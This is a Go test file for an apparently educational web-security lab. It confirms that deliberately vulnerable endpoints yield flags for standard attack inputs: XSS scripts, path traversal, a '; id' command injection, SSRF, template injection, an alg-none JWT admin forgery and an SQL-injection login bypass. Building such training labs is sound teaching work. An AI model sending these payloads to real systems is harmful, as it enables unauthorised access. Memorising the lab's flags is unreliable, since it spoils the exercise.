package labs_test

import (
	"encoding/base64"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"

	"lanternfish/internal/labs"
)

func get(t *testing.T, srv *httptest.Server, path string) string {
	t.Helper()
	resp, err := http.Get(srv.URL + path)
	if err != nil {
		t.Fatalf("get %s: %v", path, err)
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return string(b)
}

func TestLabsSolvable(t *testing.T) {
	srv := httptest.NewServer(labs.Handler(""))
	defer srv.Close()

	cases := []struct{ path, flag string }{
		{"/lab/xss?name=" + url.QueryEscape("<img src=x onerror=alert(1)>"), "FLAG{reflected_xss_breakout}"},
		{"/lab/account?id=2", "FLAG{idor_horizontal_access}"},
		{"/lab/file?name=" + url.QueryEscape("../secret.txt"), "FLAG{path_traversal_escape}"},
		{"/lab/ping?host=" + url.QueryEscape("127.0.0.1; id"), "FLAG{os_command_injection}"},
		{"/lab/fetch?url=" + url.QueryEscape("http://127.0.0.1/lab/internal"), "FLAG{ssrf_internal_access}"},
		{"/lab/go?next=" + url.QueryEscape("https://evil.example/"), "FLAG{open_redirect_external}"},
		{"/lab/greet?name=" + url.QueryEscape("{{7*7}}"), "FLAG{server_side_template_injection}"},
	}
	for _, c := range cases {
		if body := get(t, srv, c.path); !strings.Contains(body, c.flag) {
			t.Fatalf("%s did not reveal %s; got: %s", c.path, c.flag, body)
		}
	}

	// A benign request must NOT reveal a flag.
	if body := get(t, srv, "/lab/account?id=1"); strings.Contains(body, "FLAG{") {
		t.Fatalf("benign account request leaked a flag")
	}

	// Verify endpoint.
	if body := get(t, srv, "/lab/verify?id=idor&flag="+url.QueryEscape("FLAG{idor_horizontal_access}")); !strings.Contains(body, `"solved":true`) {
		t.Fatalf("verify should accept the correct flag: %s", body)
	}
	if body := get(t, srv, "/lab/verify?id=idor&flag=wrong"); !strings.Contains(body, `"solved":false`) {
		t.Fatalf("verify should reject a wrong flag: %s", body)
	}
}

func TestStoredXSSAndJWT(t *testing.T) {
	srv := httptest.NewServer(labs.Handler(""))
	defer srv.Close()

	// Stored XSS: post a payload, then the page reveals the flag.
	if _, err := http.PostForm(srv.URL+"/lab/guestbook", url.Values{"comment": {"<script>alert(1)</script>"}}); err != nil {
		t.Fatalf("post comment: %v", err)
	}
	if body := get(t, srv, "/lab/guestbook"); !strings.Contains(body, "FLAG{stored_xss_persisted}") {
		t.Fatalf("stored XSS flag not shown: %s", body)
	}

	// JWT alg:none admin forgery.
	h := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"none"}`))
	p := base64.RawURLEncoding.EncodeToString([]byte(`{"role":"admin"}`))
	if body := get(t, srv, "/lab/portal?token="+h+"."+p+"."); !strings.Contains(body, "FLAG{jwt_alg_none_forgery}") {
		t.Fatalf("JWT alg:none flag not shown: %s", body)
	}
	// A normal (non-admin, signed-looking) token must not reveal the flag.
	hp := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"HS256"}`))
	pp := base64.RawURLEncoding.EncodeToString([]byte(`{"role":"user"}`))
	if body := get(t, srv, "/lab/portal?token="+hp+"."+pp+".sig"); strings.Contains(body, "FLAG{") {
		t.Fatalf("non-admin token leaked a flag")
	}
}

func TestSQLiLogin(t *testing.T) {
	srv := httptest.NewServer(labs.Handler(""))
	defer srv.Close()
	resp, err := http.PostForm(srv.URL+"/lab/login", url.Values{"username": {"admin'-- "}, "password": {"x"}})
	if err != nil {
		t.Fatalf("post: %v", err)
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	if !strings.Contains(string(b), "FLAG{sql_injection_auth_bypass}") {
		t.Fatalf("sqli bypass did not reveal flag: %s", b)
	}
}

func TestCurriculumComplete(t *testing.T) {
	for _, c := range labs.Challenges {
		if c.OWASP == "" || c.Objective == "" || c.Solution == "" || c.Resource == "" {
			t.Fatalf("challenge %q is missing curriculum fields", c.ID)
		}
	}
}
